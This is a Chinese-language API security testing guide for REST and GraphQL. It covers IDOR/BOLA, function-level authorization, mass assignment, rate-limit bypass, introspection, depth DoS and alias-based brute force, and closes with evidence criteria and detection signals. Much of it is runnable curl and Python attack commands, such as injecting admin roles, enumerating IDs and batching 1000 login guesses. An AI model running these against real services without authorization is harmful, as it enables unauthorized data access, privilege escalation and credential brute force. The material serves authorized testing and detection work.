# REST 与 GraphQL 深度测试：五类断点与验伤判据

> 被 `api-security` 引用。REST 与 GraphQL 的测试重心不同：REST 的重心是**单个对象级
> 授权（BOLA）与批量赋值**，GraphQL 的重心是**一次请求能携带多少操作**。两者共同的
> 断点都是「声明了鉴权，实际落到 handler 时鉴权不在」。

## 一、REST：五个必须逐个过的断点

| # | 断点 | 判定输入 | 最小验证 | 常见结果 |
| --- | --- | --- | --- | --- |
| 1 | **BOLA/IDOR** | 路径/参数里的对象 ID | 用 A 的 token 请求 B 的对象 ID | 200 + B 的数据 |
| 2 | **BFLA** | 角色/管理端点 | 低权 token 请求 `/admin/*`、`/internal/*` | 200 或 401 但 body 已返回 |
| 3 | **批量赋值** | body 里的可写字段集合 | 加一个不该写的字段（`role`/`tenantId`/`isAdmin`） | 字段被写入并回读生效 |
| 4 | **速率限制缺失** | 同一端点高频请求 | 100 次并发，观察 429 出现位置 | 前 N 次全 200，无 429 |
| 5 | **过度数据暴露** | 响应字段集合 | 对比列表接口与详情接口的字段 | 列表返回 password hash / token |

### 1. BOLA（最关键，命中率最高）

```bash
# 建两个账号，拿到两份 token
TOKEN_A=$(curl -s -X POST https://api.example.com/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"Passw0rd!"}' | jq -r .access_token)
TOKEN_B=$(curl -s -X POST https://api.example.com/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"bob","password":"Passw0rd!"}' | jq -r .access_token)

# 用 A 的对象 ID 配 B 的 token
curl -i -s https://api.example.com/api/v1/orders/1001 \
  -H "Authorization: Bearer $TOKEN_B"

# 批量枚举（数字 ID 最省事；UUID 则先从 A 自己列表里拿）
for i in $(seq 1000 1010); do
  code=$(curl -s -o /tmp/o_$i.json -w '%{http_code}' \
    https://api.example.com/api/v1/orders/$i -H "Authorization: Bearer $TOKEN_B")
  echo "$i $code $(wc -c < /tmp/o_$i.json)"
done
```

**更隐蔽的变体**（一定要试，这是实战里 403 但实际越权的地方）：

- ID 放在 header：`X-User-Id`、`X-Tenant`、`X-Org-Id`
- ID 放在 body 而不是路径：`PUT /api/v1/profile` + `{"userId": 1001}`
- 嵌套对象：`/api/v1/orgs/5/users/7` —— 只校验了 org 5 属于 B，没校验 user 7
- 批量端点：`POST /api/v1/orders/batch` + `{"ids":[1001,1002]}` —— 单条校验了，批量的 where 没加 owner
- GraphQL/JSON-RPC 的 `id` 参数（见下文）

### 2. BFLA（功能级）

```bash
# 先枚举出管理端点（从 JS bundle、OpenAPI、404 差异里拿）
curl -s https://api.example.com/openapi.json | jq -r '.paths | keys[]' | grep -Ei 'admin|internal|manage|debug'

# 低权 token 逐个打
for p in /api/v1/admin/users /api/v1/internal/metrics /api/v1/admin/audit; do
  printf '%-30s ' "$p"
  curl -s -o /dev/null -w '%{http_code}\n' "https://api.example.com$p" \
    -H "Authorization: Bearer $TOKEN_USER"
done
```

**HTTP 方法维度常被漏**：`GET /admin/users` 403，但 `PUT`/`DELETE`/`PATCH` 的鉴权装饰器
漏挂。用 `OPTIONS` 先看 Allow，再逐个方法试。

```bash
curl -s -i -X OPTIONS https://api.example.com/api/v1/admin/users | grep -i allow
for m in GET POST PUT PATCH DELETE; do
  printf '%-7s ' "$m"
  curl -s -o /dev/null -w '%{http_code}\n' -X $m \
    https://api.example.com/api/v1/admin/users \
    -H "Authorization: Bearer $TOKEN_USER" -H 'Content-Type: application/json' -d '{}'
done
```

### 3. 批量赋值（Mass Assignment）

思路：从 GET 响应里抄全部字段，改成 PUT/PATCH 发回去，再插几个敏感字段。

```bash
# 1) 拿到自己的对象完整表示
curl -s https://api.example.com/api/v1/users/me -H "Authorization: Bearer $TOKEN_B" | jq . > me.json

# 2) 在原始字段基础上注入敏感字段
jq '. + {role:"admin", is_admin:true, tenant_id:"t-0001", email_verified:true, credits:99999}' \
  me.json > me_evil.json

# 3) 回写
curl -i -s -X PATCH https://api.example.com/api/v1/users/me \
  -H "Authorization: Bearer $TOKEN_B" -H 'Content-Type: application/json' \
  --data @me_evil.json

# 4) 回读确认真的落库了（这是唯一算数的证据）
curl -s https://api.example.com/api/v1/users/me -H "Authorization: Bearer $TOKEN_B" | jq '{role,tenant_id,credits}'
```

**框架差异**：

| 框架 | 默认行为 | 绕过点 |
| --- | --- | --- |
| Rails ActiveRecord | `permit` 白名单 | `permit!`、嵌套 `_attributes`、`accepts_nested_attributes_for` |
| Django REST Framework | serializer `fields` | `fields='__all__'`、嵌套 serializer、`extra_kwargs` 把 read_only 去掉 |
| Spring Boot | `@JsonIgnoreProperties` 缺省全绑 | DTO 与 Entity 同一个类时必中；`@ModelAttribute` 绑定路径参数 |
| Laravel | `$fillable` / `$guarded` | `$guarded = []` 则全开；`Model::unguard()` |
| Express/Mongoose | schema strict 默认开 | `strict:false`、`$set` 直接合并 body |
| Go (gin binding) | `ShouldBindJSON` 到 struct 全绑 | struct 里有 `Role` 字段且没做白名单 |

### 4. 速率限制缺失

```bash
# 并发 100，统计状态码分布（用 xargs 免装工具）
seq 1 100 | xargs -P 100 -I{} curl -s -o /dev/null -w '%{http_code}\n' \
  -X POST https://api.example.com/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"wrong"}' | sort | uniq -c
```

判读要点：

- 全 200/401 无 429 → 无速率限制
- 前 10 次 401，之后 429 → 有，但按 IP；换 `X-Forwarded-For` 试绕过
- 429 但 body 仍返回业务数据 → 限流在网关，业务已执行（等于没限）
- 只对 `/login` 限、对 `/reset-password` 不限 → 枚举/轰炸走后者

**限流绕过清单**：`X-Forwarded-For` / `X-Real-IP` 多值、大小写变体路径 `/API/v1/`、
末尾加点 `/login/`、`/login%2f`、`?x=1` 随机参数打散缓存键、HTTP/2 多路复用单连接。

### 5. 过度数据暴露

```bash
curl -s https://api.example.com/api/v1/users -H "Authorization: Bearer $TOKEN_B" \
  | jq '.[0] | keys'
# 关注：password / password_hash / token / internal_note / ssn / api_key / deleted_at
```

对比同一资源的不同表示（列表 vs 详情 vs 导出 vs CSV）——**字段裁剪通常只做在主接口上**。

## 二、GraphQL：先内省，再放大

### 1. 内省三级降级

```bash
# L1 标准内省
curl -s https://api.example.com/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name kind fields{name args{name type{name kind ofType{name}}}}}}}"}' | jq .

# L2 精简（只问类型名，绕过 WAF 关键词）
curl -s https://api.example.com/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name}}}"}' | jq -r '.data.__schema.types[].name'

# L3 单点探测（判断内省是否被关）
curl -s https://api.example.com/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__typename}"}'
# 返回 {"data":{"__typename":"Query"}} → schema 活着
# 返回 "GraphQL introspection is not allowed" → 关内省，走字段建议
```

**字段建议（field suggestions）是不开内省也能拿 schema 的路径**：

```bash
# 故意拼错字段名，看 Did you mean
curl -s https://api.example.com/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{ usre { id } }"}'
# {"errors":[{"message":"Cannot query field \"usre\" on type \"Query\". Did you mean \"user\", \"users\"?"}]}
```

用 `graphql-cop` 或 `clairvoyance` 自动化这个循环：

```bash
# clairvoyance 用字段建议重建 schema（内省关闭时用）
pip install clairvoyance
clairvoyance -o schema.json -u https://api.example.com/graphql \
  -H 'Authorization: Bearer '$TOKEN_B
```

### 2. 授权测试（GraphQL 的 BOLA 与 REST 一样致命）

GraphQL 常犯的错：**在 resolver 里忘了校验 owner**，因为字段在图里长得像"受控"。

```bash
# 用 B 的 token 查 A 的订单（id 是全局 ID 或数字）
curl -s https://api.example.com/graphql -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN_B" \
  -d '{"query":"query{order(id:1001){id total buyer{email} items{sku price}}}"}' | jq .

# 嵌套越权（父对象校验了，子对象没校验）
curl -s https://api.example.com/graphql -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN_B" \
  -d '{"query":"query{me{org{members{email role}}}}}"}' | jq .
```

**mutation 越权**是更高价值的目标：

```bash
# 改别人资料
curl -s https://api.example.com/graphql -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN_B" \
  -d '{"query":"mutation{updateUser(input:{id:1001,role:ADMIN}){user{id role}}}"}'

# 直接调管理 mutation（schema 里藏着的）
curl -s https://api.example.com/graphql -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN_B" \
  -d '{"query":"mutation{adminDeleteUser(id:1001){ok}}"}'
```

### 3. 深度/复杂度攻击（DoS，慎用，需授权）

```bash
# 深度递归：找自引用类型（User.friends: [User]）
python3 - <<'PY' > deep.json
d = 60
q = "{ me " + "{ friends ".replace("{ ","{ ")*0
q = "{ me " + " ".join(["{ friends" for _ in range(d)]) + " { id }" + " }"*d + " }"
print('{"query":"%s"}' % q.replace('"','\\"'))
PY
curl -s -o /dev/null -w '%{time_total} %{size_download}\n' \
  -X POST https://api.example.com/graphql -H 'Content-Type: application/json' --data @deep.json
```

### 4. 批量与别名绕过限流（GraphQL 最重要的一条）

一个 HTTP 请求 = 一次限流计数，但可以塞 1000 个操作：

```bash
# 别名轰炸：同一字段用不同别名重复 N 次
python3 - <<'PY' > alias.json
import json
ops = " ".join([f'a{i}: login(username:"alice", password:"p{i}")' for i in range(1000)])
print(json.dumps({"query": "mutation{" + ops + "}"}))
PY
curl -s -X POST https://api.example.com/graphql -H 'Content-Type: application/json' \
  --data @alias.json -o alias.out -w 'code=%{http_code} bytes=%{size_download}\n'
```

```bash
# 数组批量（GraphQL batching，很多服务器默认开）
curl -s -X POST https://api.example.com/graphql -H 'Content-Type: application/json' \
  -d '[{"query":"mutation{login(u:\"alice\",p:\"a\"){token}}"},
       {"query":"mutation{login(u:\"alice\",p:\"b\"){token}}"},
       {"query":"mutation{login(u:\"alice\",p:\"c\"){token}}"}]'
```

**这是密码爆破/OTP 爆破的主路径**：应用层限流按请求数算，攻击者一次请求打 1000 个候选。

### 5. 其他必须试的

| 手法 | 载荷 | 说明 |
| --- | --- | --- |
| 内省关但 `__type` 开 | `{__type(name:"User"){fields{name}}}` | 单类型查询常被漏关 |
| 指令滥用 | `@include(if:true)` 重复字段、`@skip` 探测 | 某些实现里指令不参与限流 |
| 持久化查询绕过 | 直接发 `{"query":"..."}` 而不带 `extensions.persistedQuery` | 服务端可能只校验了 id |
| GET 方法 | `GET /graphql?query={...}` | 只对 POST 做了 CSRF/限流 |
| 订阅滥用 | `subscription{orderUpdated{...}}` | 无鉴权的 WS 订阅能收全站事件 |
| 错误信息泄露 | 触发 resolver 异常 | `stacktrace` 字段常带文件路径 |

## 三、验伤：什么算真的打穿了

| 结论 | 必须给的证据 | 看起来成功其实是假 |
| --- | --- | --- |
| BOLA | B 的 token + 返回体含 A 的**唯一标识字段**（email/手机号/金额） | 返回 200 但是空对象 `{}`；返回的是 B 自己的数据（ID 被服务端忽略） |
| BFLA | 低权 token + 管理端点返回的业务数据或状态变更 | 返回 200 但 body 是前端 index.html（SPA 通配路由） |
| 批量赋值 | 写入后**回读**到新值；或该字段生效导致行为变化（能进管理页） | PATCH 返回 200 但字段被 DTO 丢弃；返回体里"回显"了但落库未变 |
| 无速率限制 | 100 次全 200 的时间分布 + 成功次数 | 只有第一次 200 后续 401（那是账号锁定不是限流）；429 出现在 body 已处理之后 |
| GraphQL 别名 | 单个 HTTP 请求里 N 个操作的差异化响应（如 N 个不同的 valid/invalid） | 服务端只执行第一个别名；全部返回同一个错误（解析阶段就被拒） |

**反例集合**：

- GraphQL 返回 `"errors":[{"message":"Not authorized"}]` 但 `data` 里仍有字段值 → 部分字段鉴权漏了，这才是真的，要逐个字段看
- REST `PUT /users/1001` 返回 200 且回显了 A 的数据 → 可能只是"回显请求"，要再一次 GET 1001 确认
- 限流测试里 100 并发全 401 不代表没限流——可能是账号被锁，换个账号名再测

## 四、检测视角

| 手法 | 日志/信号 | 具体特征 |
| --- | --- | --- |
| BOLA 枚举 | 访问日志 + 应用审计 | 同一 token 在短时间内访问**不连续的**对象 ID（1001,1005,1009），或跨租户 ID 前缀 |
| BFLA | 网关 + 应用 | 低权主体访问 `/admin/*` 且返回 2xx；`role` 与 `path` 不匹配 |
| 批量赋值 | 应用审计（字段级） | PATCH/PUT 请求 body 含 schema 外字段；`role`/`is_admin` 字段变更 |
| 无速率限制 | WAF/网关计数 | 单 IP 单端点在 1 分钟内 > 阈值；`User-Agent` 固定、无静态资源请求 |
| GraphQL 别名轰炸 | GraphQL 层指标 | **单请求内 operation 数**（很多网关不记这个）；query 长度 > 10KB；`query` 哈希重复 |
| 内省探测 | 应用日志 | query 含 `__schema` / `__type`；字段建议循环（大量 "Cannot query field" 错误） |
| GraphQL 深度攻击 | 执行耗时 | 单请求 CPU 时间异常；resolver 调用次数与请求数比例失衡 |

**GraphQL 特别提示**：默认的访问日志只记 `POST /graphql 200`，看不出任何东西。必须记录
**operationName + query 的归一化哈希 + 变量键集合**，否则别名轰炸完全不可见。

## 五、常见坑

1. **把 200 当成功**——REST 里大量框架在鉴权失败时也返回 200 + `{"code":403}`；GraphQL 更是永远 200。**只看 body 的语义**。
2. **只测数字 ID**——现代 API 用 UUID/ULID 就放弃了。正确做法是从自己的响应里抓别人的 ID（分享链接、日志、公开列表、GraphQL 关联字段）。
3. **漏掉方法维度**——`GET` 有鉴权不等于 `PATCH` 有。装饰器的顺序、`@PreAuthorize` 挂在哪一层，都可能导致某个方法裸奔。
4. **GraphQL 内省关了就不测了**——字段建议 + `__type` + 前端 bundle 里的 query 字符串（gql 模板字面量）三条路都能重建 schema。
5. **限流测试打太快把靶打挂**——先测低频（10 次）确认基线，再上并发；对生产只做 10-20 次并留间隔。
6. **别名轰炸忘了 `operationName`**——带 `operationName` 的查询里，服务器只执行匹配的那个，别名不会都执行。要么不带，要么用匿名 query。